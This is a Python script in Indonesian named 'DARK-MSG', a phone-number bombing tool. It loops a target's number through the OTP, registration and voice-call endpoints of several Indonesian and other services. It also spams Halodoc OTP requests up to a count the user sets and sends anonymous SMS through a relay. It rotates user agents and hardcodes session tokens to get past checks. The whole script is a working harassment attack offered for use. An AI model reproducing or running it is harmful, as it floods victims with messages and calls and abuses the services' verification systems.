import json, os, sys, time, random, string, itertools, threading
from os import system
from requests import post
from urllib.request import urlopen
# WOY KENAPA DI DOCODE ANJIRRRRRRRRRRR
# BNGST KOEE
# BERKARYA SENDIRI DONGGGGG, JANGAN MALESSSS
# AWASS KALO DI POST ULANG B*NGS*T
# KALO KETAHUAN POST ULANG, SAYA MALU - MALUIN LUU, SAYA PUNYA GRUP
# JANGAN MAIN-MAIN SAYA BNGST
END = '\33[0m'
BOLD = '\33[1m'
ITALIC = '\33[3m'
URL = '\33[4m'
BLINK = '\33[5m'
BLINK2 = '\33[6m'
SELECTED = '\33[7m'
BLACK = '\33[30m'
RED = '\33[31m'
GREEN = '\33[32m'
YELLOW = '\33[33m'
BLUE = '\33[34m'
VIOLET = '\33[35m'
BEIGE = '\33[36m'
WHITE = '\33[37m'
GREY = '\33[90m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHTGREY = '\033[37m'
DARKGREY = '\033[90m'
LIGHTRED = '\033[91m'
LIGHTGREEN = '\033[92m'
LIGHTBLUE = '\033[94m'
PINK = '\033[95m'
LIGHTCYAN = '\033[96m'



try:
	import requests
except:
	print(RED+"Anda belum menginstall bahan")
	print("memulai penginstalan....")
	time.sleep(1)
	os.system("pkg install python")
	os.system("pip install requests")


#long process here
time.sleep(2)
done = True
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def vak(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./1000)
def woy(y):
        return ''.join(random.choice(string.ascii_letters) for x in range(y))
def key():
	print(BOLD+GREEN+"\nAkses link ini dan dapatkan password"+END)
	print("--------------------------")
	print(BOLD+CYAN+"https://realsht.mobi/gCuN5"+END)
	print("--------------------------")
	keys = input(BOLD+"Masukkan password >>> "+MAGENTA)
	print(END)
	if keys == "bantaicuk":
		import load
		print("\n")
		print(BOLD+GREEN+"[Login berhasil] â"+END)
		write = open("pass.md", "w").write("bantaicuk")
		time.sleep(3)
		menu()
	else:
		import load
		print("\n")
		print(BOLD+RED+"[PASSWORD SALAH] X"+END)
		exit()

def sms(no):
	url = "https://nuubi.herokuapp.com/smsgratis"
	kata(BOLD+"MASUKKAN PESAN YANG INGIN DIKIRIM (Min. 15 Karakter)"+END)
	psn = input("\n>>> "+GREEN+BOLD).replace(" ", "+")
	if len(psn)  < 15:
		print(BOLD+RED+"Masukkan min.15 karakter LOL :v"+END)
		exit()
	kata(BOLD+LIGHTBLUE+"\nSedang mengirim.... "+END)
	lines = open(r'C:\Users\User\Documents\script\python\dark-msg\ua.txt').read().splitlines()
	acak = random.choice(lines)

	data = {
"nomor":"0"+no,
"pesan":psn
}
	head = {
"Host": "nuubi.herokuapp.com",
"Connection": "keep-alive",
"User-Agent": acak,
"Origin": "https://nuubi.herokuapp.com",
"Referer": "https://nuubi.herokuapp.com/smsgratis",
}

	posd = requests.post(url, headers=head, data=data).text
	if "SMS Gratis Telah Dikirim" in posd:
		print(BOLD+GREEN+'''
;;;;;;;;;;;;;;;;;;;;;;;;;;;
[PESAN BERHASIL TERKIRIM] â
;;;;;;;;;;;;;;;;;;;;;;;;;;;
'''+END)
		exit()
	elif "Mohon tunggu beberapa saat untuk mengirimkan sms yang sama" in posd:
		print(BOLD+CYAN+'''
##########################################################
Mohon tunggu beberapa saat untuk mengirimkan sms yang sama
##########################################################
'''+END)
	else:
		print(BOLD+RED+'''
ÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃ
[GAGAL MENGIRIM] X
ÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃ
'''+END)
		print(BOLD+YELLOW+"ON/OFF mode pesawat ngab\n"+END)
		exit()
def spam(no, jml):
	url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
	data = {
"phone_number": "+62"+no
}

	lines = open(r'C:\Users\User\Documents\script\python\dark-msg\ua.txt').read().splitlines()
	acak =random.choice(lines)
	head = {
"Host": "www.halodoc.com",
"accept": "application/json, text/plain, */*",
"x-xsrf-token": "AD64AA2190F37F55CD9A9E450FD0486D4FA41AB10001D2D1D0A4830E0375EDD566A2BE2F0CAF7E25C045F90151ADD9CF727F",
"user-agent": acak,
"content-type": "application/json",
"origin": "https://www.halodoc.com",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6",
"cookie": "XSRF-TOKEN=AD64AA2190F37F55CD9A9E450FD0486D4FA41AB10001D2D1D0A4830E0375EDD566A2BE2F0CAF7E25C045F90151ADD9CF727F"
}
	i = 1
	for x in range(int(jml)):
		x += 1
		tes = str(x)
		posd = requests.post(url, headers=head, json=data).text
		if "You can only request 10 OTPs in 30 MINUTES" in posd:
			print(BOLD+MAGENTA+"[X]Sudah mencapai limit, tunggu 30 menit lagi"+END)
			exit()
		else:
			kata(BOLD+GREEN+"["+tes+"] "+"SUKSES TERKIRIM"+END)
			i += 1
			time.sleep(2)
def indo(no):
	url = "https://www.klikindomaret.com/customer/smsverifications?nohp=0"+no
	urlopen(url)
	print(BOLD+BLUE+"==================================="+END+GREEN+BOLD)
	kata("[OTP-1] Berhasil")
	halodoc(no)
def halodoc(no):
	url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"

	data = {
"phone_number": "+62"+no
	}

	lines = open(r'C:\Users\User\Documents\script\python\dark-msg\ua.txt').read().splitlines()
	acak =random.choice(lines)

	head = {
"Host": "www.halodoc.com",
"accept": "application/json, text/plain, */*",
"x-xsrf-token": "AD64AA2190F37F55CD9A9E450FD0486D4FA41AB10001D2D1D0A4830E0375EDD566A2BE2F0CAF7E25C045F90151ADD9CF727F",
"user-agent": acak,
"content-type": "application/json",
"origin": "https://www.halodoc.com",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6",
"cookie": "XSRF-TOKEN=AD64AA2190F37F55CD9A9E450FD0486D4FA41AB10001D2D1D0A4830E0375EDD566A2BE2F0CAF7E25C045F90151ADD9CF727F"
}

	posd = requests.post(url, headers=head, json=data).text
	if "You can only request 10 OTPs in 30 MINUTES" in posd:
		kata("[OTP-2] Mencapai limit")
	else:
		kata("[OTP-2] Berhasil")
	depop(no)
def depop(no):
	url = "https://webapi.depop.com/api/v1/auth/verify/phone"

	data = {
"phone_number": "0"+no,
"country_code": "ID"
}
	lines = open(r'C:\Users\User\Documents\script\python\dark-msg\ua.txt').read().splitlines()
	acak = random.choice(lines)
	head = {
"Host": "webapi.depop.com",
"accept": "application/json, text/plain, */*",
"user-agent": acak,
"content-type": "application/json",
"origin": "https://signup.depop.com",
"referer": "https://signup.depop.com/",
}

	posd = requests.put(url, headers=head, json=data).text
	if "Too Many Requests" in posd:
		kata("[OTP-3] Mencapai limit")
	else:
		kata("[OTP-3] Berhasil")
	sun(no)

def sun(no):
	url = "https://www.matahari.com/rest/V1/thorCustomers"

	data = {
"thor_customer": {
  "name": woy(8),
  "email_address": woy(5)+"@gmail.com",
  "mobile_country_code": "+62",
  "gender_id": "1",
  "mobile_number": "0"+no,
  "mro": "",
  "password": woy(8)+"285",
  "birth_date": "27/02/2004"
  }
}
	lines = open(r'C:\Users\User\Documents\script\python\dark-msg\ua.txt').read().splitlines()
	acak =random.choice(lines)
	head = {
"Host": "www.matahari.com",
"user-agent": "Mozilla/5.0 (Linux; Android 7.0; 5061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
"content-type": "application/json",
"origin": "https://www.matahari.com",
"referer": "https://www.matahari.com/customer/account/create/",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6",
"cookie": "_ga=GA1.2.1556448484.1615045239",
"cookie": "_gid=GA1.2.1377883214.1615045239",
"cookie": "mage-cache-storage=%7B%7D",
"cookie": "mage-cache-storage-section-invalidation=%7B%7D",
"cookie": "_fbp=fb.1.1615045249518.831477839",
"cookie": "mage-messages=",
"cookie": "recently_viewed_product=%7B%7D",
"cookie": "recently_viewed_product_previous=%7B%7D",
"cookie": "recently_compared_product=%7B%7D",
"cookie": "recently_compared_product_previous=%7B%7D",
"cookie": "product_data_storage=%7B%7D",
"cookie": "section_data_ids=%7B%7D",
"cookie": "PHPSESSID=6918e49cea3938a49159f3aafd500dde",
"cookie": "_gat_UA-130272261-1=1",
"cookie": "form_key=WWDYL1szxnyvxGKr",
"cookie": "mage-cache-sessid=true",
"cookie": "ins-storage-version=5"
}

	posd = requests.post(url, headers=head, json=data).text
	if "Success" in posd:
		kata("[OTP-4] Berhasil")
	elif "error" in posd:
		kata("[OTP-4] Mencapai limit")
	else:
		kata("[OTP-4] Poor connection")
	jgw(no)

def jgw(no):
	url = "https://id.jagreward.com/member/verify-mobile/"+no+"/"
	note = urlopen(url).read().decode("utf-8")
	if "Anda telah meminta kode verifikasi melebihi batas yang diizinkan. Harap tunggu sebentar sebelum membuat permintaan kode verifikasi yang lain." in note:
		kata("[CALL] Mencapai limit")
	elif "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in note:
		kata("[CALL] Berhasil")
	else:
		kata("[CALL] Poor Connection")

	print(BOLD+RED+"==================================="+END)
	import load
	indo(no)


def menu():
	print(END)
	os.system("cls")
	print("["+SELECTED+"------------Halo-------------"+END+"]")
	try:
		open("pass.md", "r")
	except:
		key()
	os.system("cls")
	print("["+SELECTED+"                     SCRIPT DARK-MSG                     "+END+"]")
	print(BOLD+YELLOW+'''
âââââââââââââââââââââââââââââââââââââââââââââââââââ
 [!] Script ini hanya untuk hiburan
 [!] Pembuat tidak bertanggungjawab terhadap apapun
 [!] Resiko ditanggung Pengguna
âââââââââââââââââââââââââââââââââââââââââââââââââââ '''+END)
	time.sleep(1)
	print (BOLD+GREEN+'''
âââââââââââââââââââââââââââââââââ
 [â] Script created by Fikri A.F
 [â] Follow IG @fikriaf27
 [â] Donasi 0895348505284
âââââââââââââââââââââââââââââââââ '''+END)
	time.sleep(1)
	kata(BOLD+CYAN+'''
ââââââââââââââââââââââââââââ
           MENU
ââââââââââââââââââââââââââââ
 [1] BANTAI NOMOR (OTP&TLP)
 [2] SPAMSMS
 [3] KIRIM PESAN
ââââââââââââââââââââââââââââ '''+END)

	pilih = input(BOLD+"\nPilih Yang Mana => "+MAGENTA)
	print(END)
	txt = pilih.isnumeric()
	if txt == False:
		print(BOLD+"\nMasukkan yang bener njirrr\n"+END)
		exit()
	os.system("cls")
	print("["+SELECTED+"         MEMPROSES DATA         "+END+"]")
	kata(BOLD+YELLOW+"\n[!] Masukkan data dengan benar"+END)
	kata(BOLD+YELLOW+"[!] Pastikan koneksi internet lancar"+END)
	kata(BOLD+YELLOW+"[!] Jika pesan gagal kirim, coba lagi esok"+END)
	time.sleep(1)
	if pilih == '1':
		no = input(BOLD+"\nNomor yang dibantai (8xx) >>> "+CYAN)
		print(END+BOLD)
		import load
		print(END)
		indo(no)
	elif pilih == '2':
		no = input(BOLD+"\nNomor target (8xx) >>> "+CYAN)
		jml = input(END+BOLD+"Jumlah spam >>> "+CYAN)
		import load
		print(END)
		time.sleep(2)
		spam(no, jml)
	elif pilih == '3':
		no = input(END+BOLD+"\nNomor penerima (8xx) >>> "+CYAN)
		import load
		print(END)
		time.sleep(2)
		sms(no)

if __name__=="__main__":
	try:
		menu()
	except KeyboardInterrupt:
		exit(BOLD+LIGHTRED+"\nKenapa berhenti ngab ?????\n"+END)
